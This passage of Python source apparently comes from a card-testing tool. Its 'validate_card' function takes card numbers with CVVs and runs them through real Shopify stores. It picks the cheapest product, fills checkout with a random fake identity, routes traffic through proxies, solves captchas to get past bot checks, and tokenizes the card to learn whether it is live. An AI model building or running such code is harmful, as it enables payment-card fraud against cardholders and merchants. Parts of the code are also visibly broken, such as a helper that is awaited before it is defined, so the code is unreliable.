                    root = ET.fromstring(smap_resp.content)
                    urls = []
                    for child in root:
                        if child.tag.endswith('url'):
                            for loc in child:
                                if loc.tag.endswith('loc'):
                                    urls.append(loc.text)

                    if urls:
                        sample_urls = random.sample(urls, min(25, len(urls)))
                        for purl in sample_urls:
                            try:
                                p_resp = await session.get(purl, allow_redirects=True)
                                matches = _re.finditer(
                                    r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)',
                                    p_resp.text,
                                )
                                for m in matches:
                                    variant_id = m.group(1)
                                    price = float(m.group(2))
                                    if price <= 0:
                                        continue
                                    entry = {
                                        "site":       base_url,
                                        "price":      f"{price:.2f}",
                                        "price_f":    price,
                                        "variant_id": str(variant_id),
                                        "title":      "Product",
                                        "handle":     "",
                                    }
                                    any_variant.append(entry)
                                    if price < cheapest_any_price:
                                        cheapest_any_price = price
                                        cheapest_any       = entry
                                    if price <= max_price:
                                        candidates.append(entry)
                                        if price < best_price:
                                            best_price = price
                                            best       = entry
                            except Exception:
                                pass
            except Exception:
                pass

            if not any_variant:
                err = "No products found"
                _product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": False}
                return None, [], err
        else:
            for product in all_variants:
                for variant in product.get("variants", []):
                    try:
                        avail = variant.get("available", True)
                        if avail is False:
                            continue
                        price = float(variant.get("price") or "0")
                    except (ValueError, TypeError):
                        continue
                    if price <= 0:
                        continue

                    title = product.get("title", "Product")
                    entry = {
                        "site":       base_url,
                        "price":      f"{price:.2f}",
                        "price_f":    price,
                        "variant_id": str(variant["id"]),
                        "title":      title,
                        "handle":     product.get("handle", ""),
                    }
                    any_variant.append(entry)

                    if price < cheapest_any_price:
                        cheapest_any_price = price
                        cheapest_any       = entry

                    if price <= max_price:
                        # The real goods are wanted first.  An add-on is
                        # kept aside and only used when the shop has
                        # nothing else to sell.
                        if _is_an_add_on(title):
                            add_ons.append(entry)
                            if price < best_add_on_price:
                                best_add_on_price = price
                                best_add_on       = entry
                        else:
                            candidates.append(entry)
                            if price < best_price:
                                best_price = price
                                best       = entry

        # A shop that sells nothing but add-ons still sells something,
        # so those are used when there is no real good to sell.
        if not candidates and add_ons:
            candidates = add_ons
            best       = best_add_on
            best_price = best_add_on_price

        # Hard price ceiling.  Never fall back to a variant above max_price --
        # a $40 item charged against a card is not a $1 test.
        if not candidates:
            cheapest_txt = (f"${cheapest_any_price:.2f}" if cheapest_any is not None else "n/a")
            err = f"No products under ${max_price:.2f} (cheapest is {cheapest_txt})"
            _product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": True}
            return None, [], err

        if not best:
            err = f"No products under ${max_price:.2f}"
            _product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": True}
            return None, [], err

        _product_cache[cache_key] = {
            "ok":         True,
            "product":    best,
            "candidates": candidates,
            "err":        None,
            "ts":         now,
            "fallback":   False,
        }
        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        err = "Timeout"
        return None, [], err
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            res = session.close()
            if asyncio.iscoroutine(res):
                await res


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
# The words of a shop that says the order has changed under it: the
# price of the thing moved, the tax changed, the terms of the payment
# are waiting.  None of them is a word about the card.
_STALE_WORDS = (
    "EXPECTED_PRICE_MISMATCH", "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "PAYMENT_FLEXIBILITY", "TERMS_ID_MISMATCH", "PENDING_TERMS",
    "MERCHANDISE_EXPECTED", "PRICE_HAS_CHANGED", "PROPOSED_PRICE",
    "PRICE_MISMATCH", "TAX_MUST_BE_ACCEPTED", "WAITING_PENDING_TERMS",
    "UNACCEPTABLE_PAYMENT_AMOUNT", "TOTAL_AMOUNT", "REQUIRED_ARTIFACTS",
)


def _the_order_changed(errors) -> str:
    """The shop says the order has changed under it, and here is its
    word for it."""
    for one in (errors or []):
        if not isinstance(one, dict):
            continue
        # the kind of the answer says it too: the order is waiting for
        # its terms, or the shop wants something the order must accept
        kind = str(one.get("__typename") or "").upper()
        if any(w in kind for w in ("PENDINGTERM", "CONFIRMCHANGE",
                                  "UNPROCESSABLETERM", "REQUIREDARTIFACT")):
            return kind
        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                    "message", "reason"):
            val = str(one.get(fld) or "").upper()
            if not val:
                continue
            for word in _STALE_WORDS:
                if word in val:
                    return val
    return ""

async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    min_price:  Optional[float] = None,
    candidate_index: int = 0,
    hold_the_slot: bool = False,
) -> dict:
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE
    # The ceiling of the whole order.  The price of the thing is one
    # price and the order with the delivery and the tax is another, and
    # they are not the same: a thing of a dollar with a delivery of
    # fourteen is an order of fifteen.  So the order has its own
    # ceiling, and it is the one that is judged.
    effective_total_max = effective_max_price * TOTAL_MAX_FACTOR
    effective_min_price = min_price if min_price is not None else MIN_PRICE

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    proxy    = _parse_proxy(proxy_str)
    ua       = random.choice(USER_AGENTS) if USER_AGENTS else _GOOD_USER_AGENT

    def _r(response: str, charged: str = "False", approved: str = "False",
           message: Optional[str] = None,
           is_site_error: Optional[bool] = None,
           proxy_dead: bool = False) -> dict:
        code_upper = response.upper()
        try:
            _m = str(message or "")
            if ("invalid value" in _m or "Variable" in _m
                    or "not defined by type" in _m):
                with open("/tmp/npr_shape.txt", "a", encoding="utf-8") as _wf:
                    _wf.write(_m[:1200] + "\n----\n")
        except Exception:
            pass
        if is_site_error is None:
            is_site_error = code_upper not in KNOWN_CARD_RESPONSES

        final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
        proxy_status  = "Dead" if proxy_dead else "Live"

        return {
            "Response":     response,
            "Message":      message or response,
            "code":         response,
            "decline_code": response,
            "Gateway":      final_gateway,
            "Price":        price,
            "Proxy":        proxy_status,
            "Status":       (not is_site_error),
            "Gate":         final_gateway,
            "CC":           f"{cc}|{month}|{year}|{cvv}",
            "Product":      product_title,
            "Site":         ourl,
            "Charged":      charged,
            "Approved":     approved,
            "Time":         f"{round(time.time() - t0, 2)}s",
            "Waited":       f"{round(waited[0], 2)}s",
            "Retry":        is_site_error,
        }

    session, owned = _make_session(proxy_str)

    # The time of waiting for the shop is told apart from the time of
    # the shop's own answer: a shop that is quick but busy is not a
    # slow shop, and it should not be treated as one.
    waited = [0.0]

    async with _the_shop_slot(hostname, hold_the_slot):
        waited[0] = time.time() - t0
        # The clock of the shop's own answer starts here.
        t0 = time.time()
        try:
            addr         = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            # â”€â”€ 0. Fetch product â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            best, all_candidates, err = await _fetch_products(
                ourl, proxy_str, effective_max_price)

            if all_candidates:
                candidates_under_max = [
                    c for c in all_candidates
                    if effective_min_price <= float(c.get("price", 999999)) <= effective_max_price
                ]
                # Cheapest first, so a product that fits the cap after
                # shipping is found before an expensive one.
                candidates_under_max.sort(key=lambda c: float(c.get("price_f") or 0))
            else:
                candidates_under_max = (
                    [best] if (best and effective_min_price <= float(best.get("price", 999999))
                               <= effective_max_price) else []
                )

            if variant_id:
                matched = next(
                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                    None,
                )
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available",
                              message="Variant not found",
                              is_site_error=True)
                price         = matched["price"]
                product_title = matched.get("title", "")
                try:
                    if float(price) > effective_max_price:
                        return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}",
                                  message=f"${price} > ${effective_max_price:.2f}",
                                  is_site_error=True)
                except (ValueError, TypeError):
                    pass
            else:
                if not candidates_under_max:
                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}",
                              message=err or "No products",
                              is_site_error=True)
                # Walk the candidates cheapest-first.  The caller bumps
                # candidate_index when the real total (with shipping and
                # tax) comes out over the cap.
                idx = min(candidate_index, len(candidates_under_max) - 1)
                chosen_prod   = candidates_under_max[idx]
                variant_id    = chosen_prod["variant_id"]
                price         = chosen_prod["price"]
                product_title = chosen_prod.get("title", "")

            base_headers = {
                "User-Agent":         ua or _GOOD_USER_AGENT,
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Content-Type":       "application/json",
                "Origin":             ourl,
                "Referer":            f"{ourl}/",
                "sec-ch-ua":          '"Chromium";v="136", "Not_A.Brand";v="24"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            # â”€â”€ 1. Add to cart â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            cart_added = False
            throttled  = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1",
                 "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                    # Cloudflare answers a store that is rate limiting us
                    # with a 429 (or "Error 1015").  That is not a broken
                    # store, it is a store that needs room, so it is said
                    # out loud and left alone for a while.
                    if r.status_code == 429 or "too_many_requests" in r.text \
                            or "Error 1015" in r.text:
                        throttled = True
                        break
                except Exception:
                    continue

            if not cart_added:
                if throttled:
                    return _r("THROTTLED",
                              message="The store is rate limiting us (HTTP 429)",
                              is_site_error=True)
                return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)

            # â”€â”€ 2. Get checkout page â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            try:
                cr = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**base_headers,
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                )
                checkout_url = str(cr.url)
                page_text    = cr.text
            except (asyncio.TimeoutError, RequestsError):
                return _r("TIMEOUT", message="Checkout timed out", is_site_error=True)
            except Exception as ex:
                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}",
                          message=str(ex)[:100],
                          is_site_error=True)

            # â”€â”€ 2b. Captcha detection & solve â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            captcha_indicators = ('hcaptcha', 'recaptcha', 'turnstile',
                                  'cf-challenge', 'challenge-platform')
            if any(ind in page_text.lower() for ind in captcha_indicators):
                log.warning("[CAPTCHA] Detected on checkout page â€” solving...")
                captcha_token = await detect_and_solve_captcha(checkout_url, page_text, debug=True)
                if captcha_token:
                    log.warning("[CAPTCHA] Solved! Retrying with token...")
                    try:
                        cr2 = await session.get(
                            checkout_url,
                            allow_redirects=True,
                            headers={**base_headers,
                                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                                     "x-captcha-token": captcha_token,
                                     "x-turnstile-token": captcha_token,
                                     "x-hcaptcha-token": captcha_token},
                        )
                        if cr2.status_code == 200 and len(cr2.text) > len(page_text) * 0.5:
                            page_text = cr2.text
                            checkout_url = str(cr2.url)
                    except Exception as ex:
                        log.warning("captcha retry failed: %s", ex)
                else:
                    log.warning("[CAPTCHA] Solve failed â€” continuing anyway")

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                return _r("SITE_REQUIRES_LOGIN", message="Store requires login", is_site_error=True)

            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)

            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or
                "1"
            )

            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )

            for s, e in [
                ('currencyCode&quot;:&quot;', "&quot;"),
                ('"currencyCode":"', '"'),
            ]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            addr         = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone        = addr["phone"]
            street       = addr["address1"]
            city         = addr["city"]
            state        = addr["zoneCode"]
            s_zip        = addr["postalCode"]

            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id   = None
            m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "shopify-checkout-client":  "checkout-web/1.0",
                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"]     = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput":  {"sessionToken": sst},
                    "queueToken":    queue_token or "",
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":               merch_id_full,
                                    "variantId":        variant_id_full,
                                    "properties":       [],
                                    "sellingPlanId":    None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    # The proposal says nothing about the payment: the
                    # card is not in the shop yet, and a payment with
                    # nothing in it cannot cover the order.
                    "payment": None,
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":   {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":         None,
                        "proposedTotalAmount":         {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":          [],
                    },
                    "note":               {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint":  {
                        "signature":             None, "signatureUuid":         None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # â”€â”€ 3. Shipping proposal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            ship_vars      = _base_vars()
            resp_json: Any = None

            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"},
                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue

                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break

                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    log.debug("shipping proposal GQL errors: %s", gql_errs)
                    interpreted = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        try:
                            with open("/tmp/npr_shop_words.txt", "a",
                                      encoding="utf-8") as _wf:
                                _wf.write("PROPOSAL: " + str(gql_errs)[:1500] + "\n")
                        except Exception:
                            pass
                        return _r(interpreted, message=str(gql_errs[:1])[:400], is_site_error=True)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                              else "GRAPHQL_ERROR",
                              message=str(gql_errs[:1])[:900],
                              is_site_error=True)

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR", message="No session in shipping response", is_site_error=True)

            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate    = session_data.get("negotiate") or {}

            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code, message=str(neg_errors[:1])[:900], is_site_error=True)

            result_obj  = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED", message="Rate limited", is_site_error=True)
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED", message="Negotiation failed", is_site_error=True)

            checkpoint_data = result_obj.get("checkpointData")
            seller          = result_obj.get("sellerProposal") or {}

            if not seller:
                return _r("NO_SELLER_PROPOSAL", message="No seller proposal", is_site_error=True)

            running_total_data = seller.get("runningTotal") or {}
            running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

            delivery_data     = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount   = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        # Pick the cheapest strategy -- strategies[0] is often
                        # the most expensive one and blows the price ceiling.
                        def _strategy_cost(s):
                            try:
                                a = s.get("amount") or {}
                                return float(a.get("value", {}).get("amount") or a.get("amount") or "0")
                            except (ValueError, TypeError):
                                return float("inf")
                        cheapest_strategy = min(strategies, key=_strategy_cost)
                        delivery_strategy = cheapest_strategy.get("handle", "")
                        try:
                            amt_data = cheapest_strategy.get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            tax_data   = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            payment_data       = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (pm.get("extensibilityDisplayName") or
                                            pm.get("name") or pm.get("brand") or
                                            pm.get("displayName") or "Shopify Payments")
                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                            payment_identifier = pid
                            gateway = detected_gateway
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            try:
                                if float(price) > effective_total_max:
                                    raise _PriceOverMax(
                                        f"PRICE_OVER_MAX: total ${price} > ${effective_total_max:.2f}")
                            except (ValueError, TypeError):
                                pass
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                          message="Store does not use Shopify Payments",
                          is_site_error=True)

            # the order is asked about, so that the terms of the order
            # are the ones the shop has now
            await _refresh_delivery()
            async def _refresh_delivery():
                """The order is asked about again, so that the
                terms of the order are the ones the shop has
                now.  The shop moves its prices and its taxes
                between the asking and the sending, and then it
                refuses the order that was made with the old
                numbers."""
                nonlocal sst, price, running_total
                nonlocal shipping_amount, tax_amount
                nonlocal delivery_strategy
                deliv_vars = copy.deepcopy(ship_vars)
                deliv_vars["sessionInput"]["sessionToken"] = sst

                deliv_vars["delivery"]["deliveryLines"][0].update({
                    "destination": {
                        "streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": first, "lastName": last,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "expectedTotalPrice": {
                        "value": {"amount": str(shipping_amount), "currencyCode": currency}
                    },
                    "destinationChanged": False,
                })
                deliv_vars["payment"]["billingAddress"] = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                }
                deliv_vars["taxes"]["proposedTotalAmount"] = {
                    "value": {"amount": str(tax_amount), "currencyCode": currency}
                }
                deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                    "number": phone, "countryCode": country_code
                }
                if checkpoint_data:
                    deliv_vars["checkpointData"] = checkpoint_data

                try:
                    dr = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                              "operationName": "Proposal"},
                    )
                    d_resp = orjson.loads(dr.content)
                    _del_sst = dr.headers.get("x-checkout-one-session-token")
                    if _del_sst:
                        sst = _del_sst
                        gql_headers["x-checkout-one-session-token"] = sst

                    d_result = (
                        d_resp.get("data", {}).get("session", {})
                        .get("negotiate", {}).get("result", {})
                    )
                    if d_result:
                        d_typename = d_result.get("__typename", "")
                        if d_typename == "SubmittedForCompletion":
                            return _r("NO_PAYMENT_REQUIRED",
                                      message="Order auto-submitted before card entry",
                                      is_site_error=True)
                        d_seller = d_result.get("sellerProposal") or {}
                        d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                        d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                        if d_amt:
                            running_total = d_amt
                            try:
                                price = f"{float(running_total):.2f}"
                            except (ValueError, TypeError):
                                pass
                            try:
                                if float(price) > effective_max_price:
                                    raise _PriceOverMax(
                                        f"PRICE_OVER_MAX: total ${price} > ${effective_max_price:.2f}")
                            except (ValueError, TypeError):
                                pass
                        d_delivery = d_seller.get("delivery") or {}
                        if d_delivery.get("__typename") == "FilledDeliveryTerms":
                            d_d_lines = d_delivery.get("deliveryLines") or []
                            if d_d_lines:
                                d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                                d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                                if d_strategies:
                                    def _d_strategy_cost(s):
                                        try:
                                            a = s.get("amount") or {}
                                            return float(a.get("value", {}).get("amount") or a.get("amount") or "0")
                                        except (ValueError, TypeError):
                                            return float("inf")
                                    cheapest_d = min(d_strategies, key=_d_strategy_cost)
                                    if d_selected.get("handle"):
                                        delivery_strategy = d_selected["handle"]
                                    else:
                                        delivery_strategy = cheapest_d.get("handle", delivery_strategy)
                                    d_ship_amt = cheapest_d.get("amount") or {}
                                    try:
                                        shipping_amount = float(
                                            d_ship_amt.get("value", {}).get("amount") or
                                            d_ship_amt.get("amount") or "0"
                                        )
                                    except (ValueError, TypeError):
                                        pass
                        d_tax = d_seller.get("tax") or {}
                        if d_tax.get("__typename") == "FilledTaxTerms":
                            d_tax_amt = d_tax.get("totalTaxAmount") or {}
                            try:
                                tax_amount = float(
                                    d_tax_amt.get("value", {}).get("amount") or
                                    d_tax_amt.get("amount") or "0"
                                )
                            except (ValueError, TypeError):
                                pass
                except _PriceOverMax:
                    raise
                except Exception as ex:
                    log.debug("delivery proposal error: %s", ex)

            # The real order total is only known now: item + shipping + tax.
            # Enforce the ceiling against that, not just the item price.
            try:
                total = float(running_total) + shipping_amount + tax_amount
                if total > effective_total_max:
                    raise _PriceOverMax(
                        f"PRICE_OVER_MAX: total ${total:.2f} > ${effective_total_max:.2f}")
            except (ValueError, TypeError):
                pass

            # â”€â”€ 5. Tokenize card â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            vault_payload = {
                "credit_card": {
                    "number":             cc,
                    "month":              int(month),
                    "year":               int(f"20{year}"),
                    "verification_value": cvv,
                    "name":               f"{first} {last}",
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type":       "application/json",
                "Accept":             "application/json",
                "Accept-Language":    "en-US,en;q=0.9",
                "Origin":             "https://checkout.pci.shopifyinc.com",
                "User-Agent":         ua or _GOOD_USER_AGENT,
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            vault_endpoints = [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]
            # The card vault is asked more than once, and from another
            # place when the first place does not answer.  The vault is
            # the card's own door, and it has nothing to do with the shop
            # the card is going to, so a place that is tired of the shop
            # may still open the vault.
            token = None
            vault_said = ""
            _vault_sessions = [session]
            # The vault is Shopify's own door and it is not the shop's
            # door, so it is also asked with a place of its own: no
            # place at all.
            try:
                _plain = AsyncSession(impersonate=IMPERSONATE,
                                      timeout=REQUEST_TIMEOUT)
                _vault_sessions.append(_plain)
            except Exception:
                pass
            for vault_url in vault_endpoints:
                for _sess in _vault_sessions:
                    try:
                        vr = await _sess.post(
                            vault_url, json=vault_payload,
                            headers=vault_headers,
                        )
                        vd = orjson.loads(vr.content)
                        token = vd.get("id")
                        if token:
                            break
                        vault_said = str(vd.get("error") or vd.get("message")
                                         or "")[:100]
                    except Exception as e:
                        vault_said = str(e)[:100]
                if token:
                    break

            for _sess in _vault_sessions:
                try:
                    if _sess is not session:
                        await _sess.close()
